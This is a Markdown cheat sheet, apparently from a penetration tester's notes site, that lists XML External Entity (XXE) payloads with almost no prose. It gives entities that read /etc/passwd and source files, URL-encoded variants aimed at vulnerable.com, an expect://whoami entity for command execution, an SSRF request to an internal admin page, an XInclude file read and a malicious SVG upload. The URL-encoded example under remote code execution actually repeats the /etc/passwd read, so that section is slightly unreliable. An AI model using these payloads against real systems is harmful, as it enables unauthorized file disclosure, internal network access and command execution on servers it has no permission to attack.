---
title: XML External Entity (XEE)
desc: 
tags: [Burp, Web, XML, XXE]
alts: []
render_with_liquid: true
---

## Access Local Resource

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><config><location>&xxe;</location></config>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "./main.py">]><config><location>&xxe;</location></config>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "index.php">]><config><location>&xxe;</location></config>

# URL parameter (URL encode)
https://vulnerable.com/set?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22%2Fetc%2Fpasswd%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E
```

<br />

## Remote Code Execution

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://whoami">]><config><location>&xxe;</location></config>

# URL parameter (URL encode)
https://vulnerable.com/set?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E
```

<br />

## SSRF attack

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://sub.vulnerable.com/admin"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

<br />

## XInclude

```xml
POST /product/stock HTTP/1.1
...

productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>>&storeId=1
```

<br />

## File upload

```xml
<!-- exploit.svg -->

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```